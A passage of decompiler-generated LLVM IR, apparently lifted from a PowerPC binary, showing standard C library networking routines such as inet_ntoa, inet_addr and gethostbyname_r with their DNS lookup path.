  br i1 %tmp7, label %dec_label_pc_1001df38.dec_label_pc_1001df14_crit_edge, label %dec_label_pc_1001df54

dec_label_pc_1001df38.dec_label_pc_1001df14_crit_edge: ; preds = %dec_label_pc_1001df38
  %v0_1001df14.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001df14

dec_label_pc_1001df54:                            ; preds = %dec_label_pc_1001df38
  %v1_1001df58 = add i32 %v0_1001df38, 1
  ret i32 %v1_1001df58

; uselistorder directives
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1001df38, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_1001df80 = load i32, i32* %arg1, align 4
  store i32 %v2_1001df80, i32* %stack_var_-8, align 4
  store i32 268558224, i32* @lr, align 4
  %v3_1001df8c = call i32 @__GI_inet_ntoa_r(i32* nonnull %stack_var_-8, i32 ptrtoint (i32* @global_var_1004d824.1208 to i32))
  ret i32 %v3_1001df8c
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1001dfa8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268558260, i32* @lr, align 4
  %v2_1001dfb0 = bitcast i32* %stack_var_-24 to i8*
  %v3_1001dfb0 = call i32 @inet_aton(i8* %v2_1001dfb0, i32 %v2_1001dfa8)
  %v3_1001dfb4 = icmp eq i32 %v3_1001dfb0, 0
  br i1 %v3_1001dfb4, label %dec_label_pc_1001dfc4, label %dec_label_pc_1001dfc0

dec_label_pc_1001dfc0:                            ; preds = %entry
  %v3_1001dfc0 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1001dfc4

dec_label_pc_1001dfc4:                            ; preds = %entry, %dec_label_pc_1001dfc0
  %v0_1001dfd0 = phi i32 [ -1, %entry ], [ %v3_1001dfc0, %dec_label_pc_1001dfc0 ]
  ret i32 %v0_1001dfd0

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001dfc4, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1001dfe8 = call i32 @__GI___h_errno_location()
  %v2_1001dff8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268558352, i32* @lr, align 4
  %v7_1001e00c = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_1004da00.1209, i32 ptrtoint (i32* @global_var_1004d834.1210 to i32), i32 460, i32 %v2_1001dff8, i32 %v0_1001dfe8)
  %v3_1001e014 = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_1001e014
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg6, i32* @r8, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v0_1001e02c = load i32, i32* @lr, align 4
  store i32 %v0_1001e02c, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r23, align 4
  %v3_1001e034 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r31, align 4
  store i32 %arg5, i32* @r20, align 4
  store i32 %tmp, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg4, i32* @r29, align 4
  store i32 %arg6, i32* @r24, align 4
  %v2_1001e054 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_1001e054, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  br i1 %v3_1001e034, label %dec_label_pc_1001e358, label %dec_label_pc_1001e060

dec_label_pc_1001e060:                            ; preds = %entry
  %v0_1001e060 = call i32 @__errno_location()
  store i32 %v0_1001e060, i32* %r3.global-to-local, align 4
  %v1_1001e068 = inttoptr i32 %v0_1001e060 to i32*
  %v2_1001e068 = load i32, i32* %v1_1001e068, align 4
  store i32 %v2_1001e068, i32* @r27, align 4
  %v0_1001e070 = load i32, i32* @r31, align 4
  store i32 %v0_1001e070, i32* %v1_1001e068, align 4
  %v0_1001e074 = load i32, i32* %r26.global-to-local, align 4
  %v0_1001e078 = load i32, i32* @r23, align 4
  store i32 %v0_1001e078, i32* %r3.global-to-local, align 4
  %v0_1001e07c = load i32, i32* @r30, align 4
  %v0_1001e080 = load i32, i32* @r29, align 4
  %v0_1001e084 = load i32, i32* @r20, align 4
  %v0_1001e088 = load i32, i32* @r24, align 4
  store i32 268558480, i32* @lr, align 4
  %v7_1001e08c = call i32 @__get_hosts_byname_r(i32 %v0_1001e078, i32 2, i32 %v0_1001e074, i32 %v0_1001e07c, i32 %v0_1001e080, i32 %v0_1001e084, i32 %v0_1001e088)
  store i32 %v7_1001e08c, i32* %r3.global-to-local, align 4
  %v3_1001e090 = icmp eq i32 %v7_1001e08c, 0
  br i1 %v3_1001e090, label %dec_label_pc_1001e358, label %dec_label_pc_1001e098

dec_label_pc_1001e098:                            ; preds = %dec_label_pc_1001e060
  %v0_1001e098 = load i32, i32* @r24, align 4
  %v1_1001e098 = inttoptr i32 %v0_1001e098 to i32*
  %v2_1001e098 = load i32, i32* %v1_1001e098, align 4
  store i32 %v2_1001e098, i32* %r0.global-to-local, align 4
  %v3_1001e09c = icmp eq i32 %v2_1001e098, 1
  br i1 %v3_1001e09c, label %dec_label_pc_1001e0c0, label %dec_label_pc_1001e0a4

dec_label_pc_1001e0a4:                            ; preds = %dec_label_pc_1001e098
  %v3_1001e0a4 = icmp eq i32 %v2_1001e098, 4
  br i1 %v3_1001e0a4, label %dec_label_pc_1001e0c0, label %dec_label_pc_1001e0ac

dec_label_pc_1001e0ac:                            ; preds = %dec_label_pc_1001e0a4
  %v3_1001e0ac = icmp eq i32 %v2_1001e098, -1
  br i1 %v3_1001e0ac, label %dec_label_pc_1001e0b4, label %dec_label_pc_1001e358

dec_label_pc_1001e0b4:                            ; preds = %dec_label_pc_1001e0ac
  %v0_1001e0b4 = load i32, i32* @r28, align 4
  %v1_1001e0b4 = inttoptr i32 %v0_1001e0b4 to i32*
  %v2_1001e0b4 = load i32, i32* %v1_1001e0b4, align 4
  store i32 %v2_1001e0b4, i32* %r0.global-to-local, align 4
  %v3_1001e0b8 = icmp eq i32 %v2_1001e0b4, 2
  br i1 %v3_1001e0b8, label %dec_label_pc_1001e0c0, label %dec_label_pc_1001e358

dec_label_pc_1001e0c0:                            ; preds = %dec_label_pc_1001e0b4, %dec_label_pc_1001e0a4, %dec_label_pc_1001e098
  %v0_1001e0c0 = load i32, i32* @r30, align 4
  %v1_1001e0c0 = sub i32 0, %v0_1001e0c0
  store i32 %v1_1001e0c0, i32* %r0.global-to-local, align 4
  %v0_1001e0c4 = load i32, i32* @r27, align 4
  %v1_1001e0c4 = load i32, i32* @r28, align 4
  %v2_1001e0c4 = inttoptr i32 %v1_1001e0c4 to i32*
  store i32 %v0_1001e0c4, i32* %v2_1001e0c4, align 4
  %v0_1001e0c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001e0c8 = urem i32 %v0_1001e0c8, 4
  store i32 %v1_1001e0c8, i32* %r0.global-to-local, align 4
  %v3_1001e0c8 = icmp eq i32 %v1_1001e0c8, 0
  %v0_1001e0e0.pre = load i32, i32* @r29, align 4
  br i1 %v3_1001e0c8, label %dec_label_pc_1001e0e0, label %dec_label_pc_1001e0d0

dec_label_pc_1001e0d0:                            ; preds = %dec_label_pc_1001e0c0
  %v2_1001e0d0 = icmp ult i32 %v0_1001e0e0.pre, %v1_1001e0c8
  br i1 %v2_1001e0d0, label %dec_label_pc_1001e354, label %dec_label_pc_1001e0d8

dec_label_pc_1001e0d8:                            ; preds = %dec_label_pc_1001e0d0
  %v2_1001e0d8 = sub i32 %v0_1001e0e0.pre, %v1_1001e0c8
  store i32 %v2_1001e0d8, i32* @r29, align 4
  %v0_1001e0dc = load i32, i32* @r30, align 4
  %v2_1001e0dc = add i32 %v0_1001e0dc, %v1_1001e0c8
  store i32 %v2_1001e0dc, i32* @r30, align 4
  br label %dec_label_pc_1001e0e0

dec_label_pc_1001e0e0:                            ; preds = %dec_label_pc_1001e0c0, %dec_label_pc_1001e0d8
  %v0_1001e0e0 = phi i32 [ %v2_1001e0d8, %dec_label_pc_1001e0d8 ], [ %v0_1001e0e0.pre, %dec_label_pc_1001e0c0 ]
  store i32 -1, i32* @r19, align 4
  %v1_1001e0e8 = load i32, i32* @r24, align 4
  %v2_1001e0e8 = inttoptr i32 %v1_1001e0e8 to i32*
  store i32 -1, i32* %v2_1001e0e8, align 4
  %tmp29 = icmp ult i32 %v0_1001e0e0, 4
  br i1 %tmp29, label %dec_label_pc_1001e354, label %dec_label_pc_1001e0f0

dec_label_pc_1001e0f0:                            ; preds = %dec_label_pc_1001e0e0
  %v0_1001e0f0 = load i32, i32* @r29, align 4
  %v1_1001e0f0 = add i32 %v0_1001e0f0, -4
  store i32 %v1_1001e0f0, i32* %r0.global-to-local, align 4
  %tmp30 = icmp ult i32 %v1_1001e0f0, 8
  br i1 %tmp30, label %dec_label_pc_1001e354, label %dec_label_pc_1001e0fc

dec_label_pc_1001e0fc:                            ; preds = %dec_label_pc_1001e0f0
  %v1_1001e0fc = add i32 %v0_1001e0f0, -12
  store i32 %v1_1001e0fc, i32* %r0.global-to-local, align 4
  %v0_1001e100 = load i32, i32* @r30, align 4
  %v1_1001e100 = add i32 %v0_1001e100, 4
  store i32 %v1_1001e100, i32* @r25, align 4
  store i32 0, i32* @r28, align 4
  %v3_1001e10c = inttoptr i32 %v1_1001e100 to i32*
  store i32 %v0_1001e100, i32* %v3_1001e10c, align 4
  %v0_1001e110 = load i32, i32* @r28, align 4
  %v1_1001e110 = load i32, i32* @r25, align 4
  %v2_1001e110 = add i32 %v1_1001e110, 4
  %v3_1001e110 = inttoptr i32 %v2_1001e110 to i32*
  store i32 %v0_1001e110, i32* %v3_1001e110, align 4
  %tmp31 = icmp ult i32 %v1_1001e0fc, 32
  br i1 %tmp31, label %dec_label_pc_1001e354, label %dec_label_pc_1001e118

dec_label_pc_1001e118:                            ; preds = %dec_label_pc_1001e0fc
  %v0_1001e118 = load i32, i32* @r29, align 4
  %v1_1001e118 = add i32 %v0_1001e118, -44
  store i32 %v1_1001e118, i32* @r27, align 4
  %tmp32 = icmp ult i32 %v1_1001e118, 256
  br i1 %tmp32, label %dec_label_pc_1001e354, label %dec_label_pc_1001e124

dec_label_pc_1001e124:                            ; preds = %dec_label_pc_1001e118
  %v0_1001e124 = load i32, i32* @r30, align 4
  %v1_1001e124 = add i32 %v0_1001e124, 44
  store i32 %v1_1001e124, i32* @r31, align 4
  %v0_1001e128 = load i32, i32* @r23, align 4
  store i32 %v0_1001e128, i32* @r4, align 4
  %v1_1001e130 = add i32 %v0_1001e124, 12
  store i32 %v1_1001e130, i32* @r21, align 4
  store i32 %v1_1001e124, i32* %r3.global-to-local, align 4
  store i32 268558652, i32* @lr, align 4
  %v3_1001e138 = call i32 @strncpy(i32 %v1_1001e124, i32 %v0_1001e128, i32 %v1_1001e118)
  %v0_1001e13c = load i32, i32* @r31, align 4
  %v1_1001e13c = load i32, i32* @r30, align 4
  %v2_1001e13c = add i32 %v1_1001e13c, 12
  %v3_1001e13c = inttoptr i32 %v2_1001e13c to i32*
  store i32 %v0_1001e13c, i32* %v3_1001e13c, align 4
  %v0_1001e140 = load i32, i32* @r28, align 4
  %v1_1001e140 = load i32, i32* @r21, align 4
  %v2_1001e140 = add i32 %v1_1001e140, 4
  %v3_1001e140 = inttoptr i32 %v2_1001e140 to i32*
  store i32 %v0_1001e140, i32* %v3_1001e140, align 4
  %v0_1001e144 = load i32, i32* @r23, align 4
  store i32 %v0_1001e144, i32* %r3.global-to-local, align 4
  %v0_1001e148 = load i32, i32* @r30, align 4
  store i32 268558672, i32* @lr, align 4
  %v2_1001e14c = inttoptr i32 %v0_1001e144 to i8*
  %v3_1001e14c = call i32 @inet_aton(i8* %v2_1001e14c, i32 %v0_1001e148)
  store i32 %v3_1001e14c, i32* %r3.global-to-local, align 4
  store i32 %v3_1001e14c, i32* @r22, align 4
  %v3_1001e150 = icmp eq i32 %v3_1001e14c, 0
  br i1 %v3_1001e150, label %dec_label_pc_1001e184, label %dec_label_pc_1001e158

dec_label_pc_1001e158:                            ; preds = %dec_label_pc_1001e124
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1001e160 = load i32, i32* @r26, align 4
  %v2_1001e160 = add i32 %v1_1001e160, 8
  %v3_1001e160 = inttoptr i32 %v2_1001e160 to i32*
  store i32 2, i32* %v3_1001e160, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1001e168 = load i32, i32* @r31, align 4
  %v1_1001e168 = load i32, i32* @r26, align 4
  %v2_1001e168 = inttoptr i32 %v1_1001e168 to i32*
  store i32 %v0_1001e168, i32* %v2_1001e168, align 4
  %v0_1001e16c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001e16c = load i32, i32* @r26, align 4
  %v2_1001e16c = add i32 %v1_1001e16c, 12
  %v3_1001e16c = inttoptr i32 %v2_1001e16c to i32*
  store i32 %v0_1001e16c, i32* %v3_1001e16c, align 4
  %v0_1001e170 = load i32, i32* @r25, align 4
  %v1_1001e170 = load i32, i32* @r26, align 4
  %v2_1001e170 = add i32 %v1_1001e170, 16
  %v3_1001e170 = inttoptr i32 %v2_1001e170 to i32*
  store i32 %v0_1001e170, i32* %v3_1001e170, align 4
  %v0_1001e174 = load i32, i32* @r21, align 4
  %v1_1001e174 = load i32, i32* @r26, align 4
  %v2_1001e174 = add i32 %v1_1001e174, 4
  %v3_1001e174 = inttoptr i32 %v2_1001e174 to i32*
  store i32 %v0_1001e174, i32* %v3_1001e174, align 4
  %v0_1001e178 = load i32, i32* @r26, align 4
  %v1_1001e178 = load i32, i32* @r20, align 4
  %v2_1001e178 = inttoptr i32 %v1_1001e178 to i32*
  store i32 %v0_1001e178, i32* %v2_1001e178, align 4
  %v0_1001e17c = load i32, i32* @r28, align 4
  %v1_1001e17c = load i32, i32* @r24, align 4
  %v2_1001e17c = inttoptr i32 %v1_1001e17c to i32*
  store i32 %v0_1001e17c, i32* %v2_1001e17c, align 4
  br label %dec_label_pc_1001e358

dec_label_pc_1001e184:                            ; preds = %dec_label_pc_1001e124
  store i32 268558732, i32* @lr, align 4
  %v0_1001e188 = call i32 @__open_nameservers()
  %v2_1001e190 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_1001e190, i32* @r28, align 4
  store i32 %v2_1001e190, i32* %r3.global-to-local, align 4
  %v4_1001e1a4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-116, i32 268527832, i32 ptrtoint (i32* @global_var_10045068.1211 to i32))
  store i32 ptrtoint (i32* @global_var_10045068.1211 to i32), i32* %r3.global-to-local, align 4
  store i32 268558768, i32* @lr, align 4
  %v1_1001e1ac = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10045068.1211 to i32))
  %v3_1001e1b4 = load i32, i32* @global_var_1004526c.1212, align 4
  store i32 %v3_1001e1b4, i32* @r29, align 4
  store i32 %v2_1001e190, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268558788, i32* @lr, align 4
  %v0_1001e1c0 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1001e1c8 = load i32, i32* @r23, align 4
  store i32 %v0_1001e1c8, i32* %r3.global-to-local, align 4
  %v0_1001e1cc = load i32, i32* @r29, align 4
  %v2_1001e1d8 = ptrtoint i32* %stack_var_-120 to i32
  %v2_1001e1dc = ptrtoint i32* %stack_var_-100 to i32
  %v0_1001e1e0 = load i32, i32* @r22, align 4
  store i32 268558832, i32* @lr, align 4
  %v6_1001e1ec = inttoptr i32 %v0_1001e1c8 to i8*
  %v7_1001e1ec = call i32 @__dns_lookup(i8* %v6_1001e1ec, i32 1, i32 %v0_1001e1cc, i32 ptrtoint (i32* @global_var_1004eee4.1213 to i32), i32 %v2_1001e1d8, i32 %v2_1001e1dc)
  store i32 %v7_1001e1ec, i32* %r3.global-to-local, align 4
  %v1_1001e1f0 = icmp slt i32 %v7_1001e1ec, 0
  br i1 %v1_1001e1f0, label %dec_label_pc_1001e338, label %dec_label_pc_1001e1f8

dec_label_pc_1001e1f8:                            ; preds = %dec_label_pc_1001e184
  store i32 %tmp19, i32* %r11.global-to-local, align 4
  %v1_1001e200 = add i32 %tmp19, 4
  %v2_1001e204 = mul i32 %v0_1001e1e0, %v1_1001e200
  %v1_1001e208 = add i32 %v2_1001e204, 256
  %v1_1001e20c = load i32, i32* @r27, align 4
  %v3_1001e20c = icmp ugt i32 %v1_1001e208, %v1_1001e20c
  br i1 %v3_1001e20c, label %dec_label_pc_1001e214, label %dec_label_pc_1001e230

dec_label_pc_1001e214:                            ; preds = %dec_label_pc_1001e1f8
  %v3_1001e214 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1001e214, i32* @r3, align 4
  store i32 268558876, i32* @lr, align 4
  %v0_1001e218 = call i32 @free()
  %v3_1001e21c = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1001e21c, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001e224.1214 to i32), i32* @lr, align 4
  %v0_1001e220 = call i32 @free()
  store i32 34, i32* %r3.global-to-local, align 4
  %v0_1001e228 = load i32, i32* @r19, align 4
  %v1_1001e228 = load i32, i32* @r24, align 4
  %v2_1001e228 = inttoptr i32 %v1_1001e228 to i32*
  store i32 %v0_1001e228, i32* %v2_1001e228, align 4
  br label %dec_label_pc_1001e358

dec_label_pc_1001e230:                            ; preds = %dec_label_pc_1001e1f8
  %v3_1001e230 = icmp eq i32 %v0_1001e1e0, 0
  br i1 %v3_1001e230, label %dec_label_pc_1001e230.dec_label_pc_1001e2d4_crit_edge, label %dec_label_pc_1001e238

dec_label_pc_1001e230.dec_label_pc_1001e2d4_crit_edge: ; preds = %dec_label_pc_1001e230
  %v0_1001e2dc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001e2d4

dec_label_pc_1001e238:                            ; preds = %dec_label_pc_1001e230
  %v2_1001e238 = mul i32 %v0_1001e1e0, %tmp19
  store i32 %v2_1001e238, i32* @r5, align 4
  %v0_1001e23c = load i32, i32* @r30, align 4
  %v1_1001e23c = add i32 %v0_1001e23c, 36
  store i32 %v1_1001e23c, i32* %r3.global-to-local, align 4
  %v0_1001e240 = load i32, i32* @r31, align 4
  store i32 268558920, i32* @lr, align 4
  %v2_1001e244 = call i32 @memmove(i32 %v1_1001e23c, i32 %v0_1001e240)
  store i32 %v2_1001e244, i32* %r3.global-to-local, align 4
  store i32 %v2_1001e238, i32* %r0.global-to-local, align 4
  %v0_1001e254 = load i32, i32* @r30, align 4
  %v1_1001e254 = load i32, i32* @r31, align 4
  %v3_1001e254 = add i32 %v1_1001e254, %v2_1001e238
  %v4_1001e254 = inttoptr i32 %v3_1001e254 to i32*
  store i32 %v0_1001e254, i32* %v4_1001e254, align 4
  %v0_1001e258 = load i32, i32* @r31, align 4
  %v1_1001e258 = load i32, i32* %r0.global-to-local, align 4
  %v2_1001e258 = add i32 %v1_1001e258, %v0_1001e258
  store i32 %v2_1001e258, i32* @r25, align 4
  %v1_1001e260 = add i32 %v0_1001e1e0, -1
  store i32 %v1_1001e260, i32* %r11.global-to-local, align 4
  %v1_1001e264 = add i32 %v0_1001e1e0, 1
  %v2_1001e268 = icmp sgt i32 %v1_1001e260, -1
  store i32 %v1_1001e264, i32* %ctr.global-to-local, align 4
  br i1 %v2_1001e268, label %dec_label_pc_1001e298.preheader, label %dec_label_pc_1001e274

dec_label_pc_1001e274:                            ; preds = %dec_label_pc_1001e238
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001e298.preheader

dec_label_pc_1001e298.preheader:                  ; preds = %dec_label_pc_1001e274, %dec_label_pc_1001e238
  %v0_1001e2a06 = phi i32 [ 1, %dec_label_pc_1001e274 ], [ %v1_1001e264, %dec_label_pc_1001e238 ]
  %v1_1001e2983 = mul i32 %v1_1001e260, 4
  store i32 %v1_1001e2983, i32* %r0.global-to-local, align 4
  %v2_1001e29c5 = add i32 %v2_1001e258, %v1_1001e2983
  %v1_1001e2a07 = add i32 %v0_1001e2a06, -1
  store i32 %v1_1001e2a07, i32* %ctr.global-to-local, align 4
  %v2_1001e2a08 = icmp eq i32 %v1_1001e2a07, 0
  br i1 %v2_1001e2a08, label %dec_label_pc_1001e2a4, label %dec_label_pc_1001e280

dec_label_pc_1001e280:                            ; preds = %dec_label_pc_1001e298.preheader, %dec_label_pc_1001e280.dec_label_pc_1001e280_crit_edge
  %v1_1001e294 = phi i32 [ %v2_1001e29c, %dec_label_pc_1001e280.dec_label_pc_1001e280_crit_edge ], [ %v2_1001e29c5, %dec_label_pc_1001e298.preheader ]
  %v0_1001e28c = phi i32 [ %v0_1001e28c.pre, %dec_label_pc_1001e280.dec_label_pc_1001e280_crit_edge ], [ %v0_1001e258, %dec_label_pc_1001e298.preheader ]
  %v0_1001e284 = phi i32 [ %v0_1001e298, %dec_label_pc_1001e280.dec_label_pc_1001e280_crit_edge ], [ %v1_1001e260, %dec_label_pc_1001e298.preheader ]
  %v2_1001e284 = mul i32 %v0_1001e284, %tmp19
  %v1_1001e288 = add i32 %v0_1001e284, -1
  store i32 %v1_1001e288, i32* %r11.global-to-local, align 4
  %v2_1001e28c = add i32 %v0_1001e28c, -8
  %v1_1001e290 = add i32 %v2_1001e28c, %v2_1001e284
  %v2_1001e294 = add i32 %v1_1001e294, 4
  %v3_1001e294 = inttoptr i32 %v2_1001e294 to i32*
  store i32 %v1_1001e290, i32* %v3_1001e294, align 4
  %v0_1001e298 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001e298 = mul i32 %v0_1001e298, 4
  store i32 %v1_1001e298, i32* %r0.global-to-local, align 4
  %v1_1001e29c = load i32, i32* @r25, align 4
  %v0_1001e2a0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001e2a0 = add i32 %v0_1001e2a0, -1
  store i32 %v1_1001e2a0, i32* %ctr.global-to-local, align 4
  %v2_1001e2a0 = icmp eq i32 %v1_1001e2a0, 0
  br i1 %v2_1001e2a0, label %dec_label_pc_1001e2a4, label %dec_label_pc_1001e280.dec_label_pc_1001e280_crit_edge

dec_label_pc_1001e280.dec_label_pc_1001e280_crit_edge: ; preds = %dec_label_pc_1001e280
  %v2_1001e29c = add i32 %v1_1001e29c, %v1_1001e298
  %v0_1001e28c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001e280

dec_label_pc_1001e2a4:                            ; preds = %dec_label_pc_1001e280, %dec_label_pc_1001e298.preheader
  %v1_1001e2b0 = phi i32 [ %v2_1001e258, %dec_label_pc_1001e298.preheader ], [ %v1_1001e29c, %dec_label_pc_1001e280 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1001e2ac = mul i32 %v0_1001e1e0, 4
  %v2_1001e2b0 = add i32 %v1_1001e2ac, 4
  %v2_1001e2b4 = add i32 %v2_1001e2b0, %v1_1001e2b0
  %v3_1001e2b4 = inttoptr i32 %v2_1001e2b4 to i32*
  store i32 0, i32* %v3_1001e2b4, align 4
  %v0_1001e2c0 = load i32, i32* @r25, align 4
  %v2_1001e2c0 = add i32 %v0_1001e2c0, %v1_1001e2ac
  store i32 %v2_1001e2c0, i32* %r11.global-to-local, align 4
  %v1_1001e2c4 = load i32, i32* @r31, align 4
  %v2_1001e2c4 = sub i32 %v1_1001e2c4, %v2_1001e2c0
  %v1_1001e2c8 = add i32 %v2_1001e2c0, 8
  store i32 %v1_1001e2c8, i32* @r31, align 4
  %v0_1001e2cc = load i32, i32* @r27, align 4
  %v2_1001e2cc = add i32 %v0_1001e2cc, %v2_1001e2c4
  %v1_1001e2d0 = add i32 %v2_1001e2cc, -8
  store i32 %v1_1001e2d0, i32* @r27, align 4
  br label %dec_label_pc_1001e2d4

dec_label_pc_1001e2d4:                            ; preds = %dec_label_pc_1001e230.dec_label_pc_1001e2d4_crit_edge, %dec_label_pc_1001e2a4
  %v0_1001e2dc = phi i32 [ %v0_1001e2dc.pre, %dec_label_pc_1001e230.dec_label_pc_1001e2d4_crit_edge ], [ %v1_1001e2c8, %dec_label_pc_1001e2a4 ]
  %v0_1001e2d8 = phi i32 [ %v1_1001e20c, %dec_label_pc_1001e230.dec_label_pc_1001e2d4_crit_edge ], [ %v1_1001e2d0, %dec_label_pc_1001e2a4 ]
  %v3_1001e2d4 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1001e2d4, i32* @r4, align 4
  store i32 %v0_1001e2dc, i32* %r3.global-to-local, align 4
  store i32 268559076, i32* @lr, align 4
  %v3_1001e2e0 = call i32 @strncpy(i32 %v0_1001e2dc, i32 %v3_1001e2d4, i32 %v0_1001e2d8)
  %v3_1001e2e4 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1001e2e4, i32* @r3, align 4
  store i32 268559084, i32* @lr, align 4
  %v0_1001e2e8 = call i32 @free()
  store i32 %v0_1001e2e8, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v3_1001e2f0 = icmp eq i32 %tmp18, 1
  br i1 %v3_1001e2f0, label %dec_label_pc_1001e2f8, label %dec_label_pc_1001e340

dec_label_pc_1001e2f8:                            ; preds = %dec_label_pc_1001e2d4
  store i32 4, i32* @r5, align 4
  %v0_1001e300 = load i32, i32* @r30, align 4
  store i32 %v0_1001e300, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1001e308.1215 to i32), i32* @lr, align 4
  %v0_1001e304 = call i32 @memcpy()
  %v1_1001e30c = load i32, i32* @r26, align 4
  %v2_1001e30c = add i32 %v1_1001e30c, 8
  %v3_1001e30c = inttoptr i32 %v2_1001e30c to i32*
  store i32 2, i32* %v3_1001e30c, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1001e314 = load i32, i32* @r26, align 4
  %v2_1001e314 = add i32 %v1_1001e314, 12
  %v3_1001e314 = inttoptr i32 %v2_1001e314 to i32*
  store i32 4, i32* %v3_1001e314, align 4
  %v0_1001e318 = load i32, i32* @r31, align 4
  %v1_1001e318 = load i32, i32* @r26, align 4
  %v2_1001e318 = inttoptr i32 %v1_1001e318 to i32*
  store i32 %v0_1001e318, i32* %v2_1001e318, align 4
  %v0_1001e31c = load i32, i32* @r25, align 4
  %v1_1001e31c = load i32, i32* @r26, align 4
  %v2_1001e31c = add i32 %v1_1001e31c, 16
  %v3_1001e31c = inttoptr i32 %v2_1001e31c to i32*
  store i32 %v0_1001e31c, i32* %v3_1001e31c, align 4
  %v0_1001e320 = load i32, i32* @r21, align 4
  %v1_1001e320 = load i32, i32* @r26, align 4
  %v2_1001e320 = add i32 %v1_1001e320, 4
  %v3_1001e320 = inttoptr i32 %v2_1001e320 to i32*
  store i32 %v0_1001e320, i32* %v3_1001e320, align 4
  %v3_1001e324 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1001e324, i32* @r3, align 4
  store i32 268559148, i32* @lr, align 4
  %v0_1001e328 = call i32 @free()
  store i32 %v0_1001e328, i32* %r3.global-to-local, align 4
  %v0_1001e32c = load i32, i32* @r26, align 4
  %v1_1001e32c = load i32, i32* @r20, align 4
  %v2_1001e32c = inttoptr i32 %v1_1001e32c to i32*
  store i32 %v0_1001e32c, i32* %v2_1001e32c, align 4
  br label %dec_label_pc_1001e338

dec_label_pc_1001e338:                            ; preds = %dec_label_pc_1001e340, %dec_label_pc_1001e184, %dec_label_pc_1001e2f8
  %storemerge1 = phi i32 [ 0, %dec_label_pc_1001e2f8 ], [ 2, %dec_label_pc_1001e184 ], [ 2, %dec_label_pc_1001e340 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_1001e2f8 ], [ 1, %dec_label_pc_1001e184 ], [ 1, %dec_label_pc_1001e340 ]
  store i32 %storemerge1, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_1001e338 = load i32, i32* @r24, align 4
  %v2_1001e338 = inttoptr i32 %v1_1001e338 to i32*
  store i32 %storemerge, i32* %v2_1001e338, align 4
  br label %dec_label_pc_1001e358

dec_label_pc_1001e340:                            ; preds = %dec_label_pc_1001e2d4
  %v3_1001e340 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1001e340, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001e348.1216 to i32), i32* @lr, align 4
  %v0_1001e344 = call i32 @free()
  store i32 %v0_1001e344, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001e338

dec_label_pc_1001e354:                            ; preds = %dec_label_pc_1001e118, %dec_label_pc_1001e0fc, %dec_label_pc_1001e0f0, %dec_label_pc_1001e0e0, %dec_label_pc_1001e0d0
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001e358

